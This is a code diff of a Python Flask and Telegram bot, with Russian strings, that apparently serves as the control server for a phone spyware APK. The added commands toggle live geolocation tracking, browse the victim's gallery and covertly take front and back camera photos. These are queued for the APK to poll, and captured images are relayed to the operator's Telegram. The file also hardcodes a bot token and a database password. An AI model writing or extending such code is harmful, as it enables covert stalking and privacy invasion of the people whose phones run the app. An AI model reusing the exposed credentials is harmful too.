@@ -2,18 +2,16 @@ import os
 import telebot
 import psycopg2
 from flask import Flask, request
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 
-# ===== НАСТРОЙКИ =====
 BOT_TOKEN = "8662374904:AAEMd1FOnIyAmmqW_Gh0k5_Sgam-QUBk_bs"
 ADMIN_ID = 8699816052
 WEBHOOK_URL = "https://ghost-bot-97za.onrender.com"
 DATABASE_URL = "postgresql://ghost_db_2bxc_user:CWGylqBJ2Bdl8lHRqldxCyTr4PWCrRPV@dpg-dahd5vuk1f9s73fclhgg-a/ghost_db_2bxc"
-# =====================
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# ===== БАЗА ДАННЫХ =====
 def get_db():
     return psycopg2.connect(DATABASE_URL, sslmode='require')
 
@@ -40,53 +38,75 @@ def add_command(command):
     cur.close()
     conn.close()
 
-# ===== КОМАНДЫ БОТА =====
+# ===== КОМАНДЫ =====
 
 @bot.message_handler(commands=['start'])
 def start(message):
     if message.chat.id != ADMIN_ID:
         return
     bot.send_message(message.chat.id,
-        "🔐 Бот управления активирован.\n"
-        "Команды:\n"
-        "/geo — получить геолокацию\n"
-        "/gallery — галерея\n"
-        "/camera — фото с камеры\n"
-        "/status — статус"
+        "🔐 Бот управления активирован.\n\n"
+        "📍 ГЕО:\n"
+        "/geo_on — включить трансляцию\n"
+        "/geo_off — выключить трансляцию\n"
+        "/geo — разовая гео\n\n"
+        "📸 ГАЛЕРЕЯ:\n"
+        "/photo — последнее фото\n"
+        "/selfie — фото с фронталки\n"
+        "/photo_back — фото с задней камеры\n"
     )
+
+@bot.message_handler(commands=['geo_on'])
+def geo_on(message):
+    if message.chat.id != ADMIN_ID: return
+    add_command("geo_on")
+    bot.send_message(message.chat.id, "📍 Трансляция ВКЛЮЧЕНА")
+
+@bot.message_handler(commands=['geo_off'])
+def geo_off(message):
+    if message.chat.id != ADMIN_ID: return
+    add_command("geo_off")
+    bot.send_message(message.chat.id, "📍 Трансляция ВЫКЛЮЧЕНА")
 
 @bot.message_handler(commands=['geo'])
 def geo(message):
-    if message.chat.id != ADMIN_ID:
-        return
+    if message.chat.id != ADMIN_ID: return
     add_command("geo")
-    bot.send_message(message.chat.id, "📍 Команда отправлена на телефон.")
+    bot.send_message(message.chat.id, "📍 Запрос отправлен")
 
-@bot.message_handler(commands=['gallery'])
-def gallery(message):
-    if message.chat.id != ADMIN_ID:
-        return
+@bot.message_handler(commands=['photo'])
+def photo(message):
+    if message.chat.id != ADMIN_ID: return
     add_command("gallery")
-    bot.send_message(message.chat.id, "📸 Команда отправлена.")
+    keyboard = [[
+        InlineKeyboardButton("⬅️ Назад", callback_data="prev"),
+        InlineKeyboardButton("Вперёд ➡️", callback_data="next")
+    ]]
+    bot.send_message(message.chat.id, "📸 Загружаю...", reply_markup=InlineKeyboardMarkup(keyboard))
 
-@bot.message_handler(commands=['camera'])
-def camera(message):
-    if message.chat.id != ADMIN_ID:
-        return
-    add_command("camera")
-    bot.send_message(message.chat.id, "📷 Команда отправлена.")
+@bot.message_handler(commands=['selfie'])
+def selfie(message):
+    if message.chat.id != ADMIN_ID: return
+    add_command("camera_front")
+    bot.send_message(message.chat.id, "🤳 Делаю фото...")
 
-@bot.message_handler(commands=['status'])
-def status(message):
-    if message.chat.id != ADMIN_ID:
-        return
-    bot.send_message(message.chat.id, "✅ Бот работает.")
+@bot.message_handler(commands=['photo_back'])
+def photo_back(message):
+    if message.chat.id != ADMIN_ID: return
+    add_command("camera_back")
+    bot.send_message(message.chat.id, "📷 Делаю фото...")
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback(call):
+    if call.data == "next":
+        add_command("gallery_next")
+    elif call.data == "prev":
+        add_command("gallery_prev")
 
 # ===== API ДЛЯ APK =====
 
 @app.route('/get_command', methods=['GET'])
 def get_command():
-    """APK запрашивает — есть ли новые команды"""
     conn = get_db()
     cur = conn.cursor()
     cur.execute("SELECT id, command FROM commands WHERE processed = FALSE ORDER BY id LIMIT 1")
@@ -103,21 +123,18 @@ def get_command():
 
 @app.route('/send_photo', methods=['POST'])
 def send_photo():
-    """APK присылает фото — бот пересылает в Telegram"""
     data = request.get_json()
     if not data or 'image' not in data:
         return {'status': 'error'}, 400
-
     import base64, requests
     image_data = data['image']
     if ',' in image_data:
         image_data = image_data.split(',')[1]
-
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
         files = {'photo': ('photo.jpg', base64.b64decode(image_data), 'image/jpeg')}
         payload = {'chat_id': ADMIN_ID, 'caption': '📸 Фото'}
-        r = requests.post(url, files=files, data=payload)
+        requests.post(url, files=files, data=payload)
         return {'status': 'ok'}
     except Exception as e:
         return {'status': 'error', 'message': str(e)}, 500
@@ -136,8 +153,6 @@ def webhook():
 @app.route('/')
 def index():
     return 'Bot is running'
-
-# ===== ЗАПУСК =====
 
 if __name__ == '__main__':
     init_db()
